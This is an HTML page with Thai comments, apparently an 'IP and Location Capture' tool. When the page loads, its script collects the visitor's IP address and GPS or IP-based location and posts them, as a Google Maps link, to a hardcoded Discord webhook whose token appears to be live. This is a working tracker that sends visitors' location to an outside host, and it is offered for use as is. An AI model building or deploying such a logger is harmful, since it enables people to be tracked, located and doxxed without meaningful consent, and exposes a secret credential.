<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP and Location Capture</title>
    <script>
        window.onload = async function() {
            // ฟังก์ชันเพื่อดึงข้อมูลตำแหน่งจาก IP Address ผ่าน IP Geolocation API
            async function getIpLocation() {
                try {
                    const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // เปลี่ยน TOKEN เป็น API Key ของคุณ
                    const ipData = await ipResponse.json();
                    return ipData;
                } catch (error) {
                    console.error("Error fetching IP location:", error);
                    return null;
                }
            }

            // ดึง IP ของผู้ใช้จาก ipify API
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // ฟังก์ชันที่จะส่งข้อมูลไปยัง Discord Webhook
            async function sendToWebhook(content) {
                const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // ใช้ Webhook ของคุณ
                const payload = {
                    content: content
                };
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });

                    if (response.ok) {
                        console.log("Data sent to Discord successfully!");
                    } else {
                        console.error("Error sending data to Discord.");
                    }
                } catch (error) {
                    console.error("Error sending data to Discord:", error);
                }
            }

            // ถ้าผู้ใช้อนุญาตให้เข้าถึงตำแหน่งจาก GPS
            if ("geolocation" in navigator) {
                console.log("กำลังดึงข้อมูลตำแหน่งจาก GPS...");
                navigator.geolocation.getCurrentPosition(async function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    console.log("ตำแหน่ง GPS:", latitude, longitude);

                    // สร้าง Google Maps Link
                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                    // ส่งข้อมูลไปยัง Discord
                    const content = `
                        IP: ${ip}
                        ตำแหน่ง (GPS): ${googleMapsLink}
                    `;
                    await sendToWebhook(content);
                    alert("IP และตำแหน่งถูกบันทึกและส่งไปยัง Discord Webhook เรียบร้อยแล้ว!");
                }, async function(error) {
                    alert("ไม่สามารถดึงตำแหน่งจาก GPS ได้, จึงใช้ข้อมูลจาก IP เท่านั้น.");

                    // ใช้ตำแหน่งจาก IP
                    const ipLocationData = await getIpLocation();
                    const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
                    console.log("ตำแหน่งจาก IP:", ipLocation);

                    const content = `
                        IP: ${ip}
                        ตำแหน่งจาก IP: https://www.google.com/maps?q=${ipLocation[0]},${ipLocation[1]}
                    `;
                    await sendToWebhook(content);
                    alert("ข้อมูลจาก IP ถูกส่งไปยัง Discord Webhook!");
                });
            } else {
                alert("Geolocation API ไม่รองรับในเบราว์เซอร์นี้.");

                // หากไม่ได้รับตำแหน่ง ให้ใช้ตำแหน่งจาก IP
                const ipLocationData = await getIpLocation();
                const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
                console.log("ตำแหน่งจาก IP:", ipLocation);

                const content = `
                    IP: ${ip}
                    ตำแหน่งจาก IP: https://www.google.com/maps?q=${ipLocation[0]},${ipLocation[1]}
                `;
                await sendToWebhook(content);
                alert("ข้อมูลจาก IP ถูกส่งไปยัง Discord Webhook!");
            }
        };
    </script>
</head>
<body>
    <h1>กำลังบันทึก IP และตำแหน่งของคุณ...</h1>
</body>
</html>
